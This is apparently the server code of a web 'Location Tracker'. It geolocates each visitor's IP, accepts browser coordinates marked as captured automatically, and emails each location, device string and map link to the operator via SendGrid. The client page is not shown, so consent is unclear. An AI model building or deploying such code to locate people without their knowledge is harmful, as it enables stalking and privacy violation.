// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const sgMail = require('@sendgrid/mail');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// ===== SENDGRID EMAIL CONFIGURATION =====
console.log('\n📧 SendGrid Configuration:');
console.log(`SENDGRID_API_KEY: ${process.env.SENDGRID_API_KEY ? '✅ Set (' + process.env.SENDGRID_API_KEY.length + ' chars)' : '❌ Missing'}`);
console.log(`EMAIL_USER: ${process.env.EMAIL_USER ? '✅ Set' : '❌ Missing'}`);
console.log(`EMAIL_TO: ${process.env.EMAIL_TO ? '✅ Set' : '❌ Missing'}\n`);

// Initialize SendGrid
if (process.env.SENDGRID_API_KEY) {
    sgMail.setApiKey(process.env.SENDGRID_API_KEY);
    console.log('✅ SendGrid initialized successfully!');
} else {
    console.error('❌ SENDGRID_API_KEY not set!');
}

// Store latest location
let latestLocation = null;
let locationHistory = [];

// ===== ROUTES =====

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        locationCount: locationHistory.length,
        hasLocation: !!latestLocation,
        emailConfigured: !!process.env.SENDGRID_API_KEY
    });
});

// API config
app.get('/api/config', (req, res) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['host'] || 'localhost:3000';
    res.json({
        success: true,
        data: {
            baseUrl: `${protocol}://${host}`,
            isProduction: process.env.NODE_ENV === 'production',
            emailConfigured: !!process.env.SENDGRID_API_KEY
        }
    });
});

// Get latest location
app.get('/api/latest-location', (req, res) => {
    res.json({
        success: !!latestLocation,
        data: latestLocation || null
    });
});

// TEST EMAIL ENDPOINT
app.get('/test-email', async (req, res) => {
    console.log('📧 Test email requested...');
    
    if (!process.env.SENDGRID_API_KEY) {
        return res.status(500).json({
            success: false,
            error: 'SENDGRID_API_KEY not configured'
        });
    }

    try {
        const msg = {
            to: process.env.EMAIL_TO,
            from: process.env.EMAIL_USER,
            subject: '✅ Test Email - Location Tracker',
            text: 'If you receive this, SendGrid is working!',
            html: '<h1>✅ SendGrid Working!</h1><p>Location tracker is configured correctly.</p>'
        };

        await sgMail.send(msg);
        console.log('✅ Test email sent!');
        res.json({
            success: true,
            message: 'Test email sent! Check your inbox.'
        });
    } catch (error) {
        console.error('❌ Test email failed:', error.message);
        if (error.response) {
            console.error('Response:', error.response.body);
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// FAST IP LOCATION (<1 second)
app.get('/api/ip-location', async (req, res) => {
    try {
        let clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                       req.connection.remoteAddress || 
                       req.ip;

        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.substring(7);
        }

        if (clientIP === '::1' || clientIP === '127.0.0.1' || clientIP === 'localhost') {
            return res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'New York (Test)',
                    country: 'US',
                    accuracy: 'IP-based',
                    source: 'IP (Test)'
                }
            });
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,lat,lon,city,country,query`, {
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        
        const data = await response.json();

        if (data.status === 'success') {
            res.json({
                success: true,
                data: {
                    latitude: data.lat,
                    longitude: data.lon,
                    city: data.city || 'Unknown',
                    country: data.country || 'Unknown',
                    ip: data.query,
                    accuracy: 'IP-based',
                    source: 'IP'
                }
            });
        } else {
            res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'Unknown',
                    country: 'Unknown',
                    accuracy: 'IP-based (fallback)',
                    source: 'IP (Fallback)'
                }
            });
        }
    } catch (error) {
        console.error('IP location error:', error);
        res.json({
            success: true,
            data: {
                latitude: 40.7128,
                longitude: -74.0060,
                city: 'Unknown',
                country: 'Unknown',
                accuracy: 'IP-based (error fallback)',
                source: 'IP (Error)'
            }
        });
    }
});

// TRACK LOCATION - SENDS EMAIL VIA SENDGRID
app.post('/api/track-location', async (req, res) => {
    console.log('\n📍 Track location endpoint hit');
    
    try {
        const { latitude, longitude, accuracy, source, userAgent, autoFetched } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({
                success: false,
                message: 'Missing coordinates'
            });
        }

        console.log(`📍 Location: ${latitude}, ${longitude}`);
        console.log(`📡 Source: ${source || 'IP'}`);
        console.log(`🔄 Auto: ${autoFetched ? 'Yes' : 'No'}`);

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toLocaleString();

        const locationData = {
            latitude,
            longitude,
            accuracy: accuracy || 0,
            source: source || 'IP',
            autoFetched: autoFetched || false,
            timestamp: new Date().toISOString(),
            mapsLink
        };
        
        latestLocation = locationData;
        locationHistory.push({ ...locationData, capturedAt: new Date().toISOString() });

        // SEND EMAIL VIA SENDGRID
        console.log('📧 Attempting to send email via SendGrid...');
        
        if (process.env.SENDGRID_API_KEY) {
            try {
                const emailHtml = `
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <style>
                            body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
                            .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                            .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
                            .header h1 { margin: 0; }
                            .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
                            .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
                            .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
                            .info-row:last-child { border-bottom: none; }
                            .label { font-weight: bold; color: #495057; }
                            .value { color: #212529; }
                            .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
                            .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <div class="header">
                                <h1>📍 Location Tracked</h1>
                                <p>${timestamp}</p>
                                <span class="badge">📡 ${source || 'IP'}</span>
                                ${autoFetched ? ' <span class="badge" style="background:#17a2b8;color:white;">🔄 Auto</span>' : ''}
                            </div>
                            <div class="info">
                                <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
                                <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
                                <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy || 'N/A'}m</span></div>
                                <div class="info-row"><span class="label">📱 Device:</span><span class="value" style="font-size:12px;">${userAgent || 'Unknown'}</span></div>
                            </div>
                            <div style="text-align: center;">
                                <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
                            </div>
                            <div class="footer">
                                <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
                            </div>
                        </div>
                    </body>
                    </html>
                `;

                const msg = {
                    to: process.env.EMAIL_TO,
                    from: process.env.EMAIL_USER,
                    subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
                    html: emailHtml,
                    text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy || 'N/A'}m\nMaps: ${mapsLink}`
                };

                await sgMail.send(msg);
                console.log(`✅ EMAIL SENT SUCCESSFULLY via SendGrid!`);
                console.log(`📧 To: ${process.env.EMAIL_TO}`);
                
            } catch (emailError) {
                console.error('❌ EMAIL SEND FAILED:');
                console.error('Error:', emailError.message);
                if (emailError.response) {
                    console.error('Response:', JSON.stringify(emailError.response.body, null, 2));
                }
            }
        } else {
            console.error('❌ SENDGRID_API_KEY not configured - email not sent');
        }

        // Always respond success (even if email fails)
        res.json({
            success: true,
            message: 'Location tracked!',
            mapsLink: mapsLink,
            emailSent: !!process.env.SENDGRID_API_KEY
        });

    } catch (error) {
        console.error('❌ Server error:', error);
        res.status(500).json({
            success: false,
            message: error.message
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📍 Test email: https://your-app.onrender.com/test-email`);
    console.log(`📍 App: https://your-app.onrender.com\n`);
});
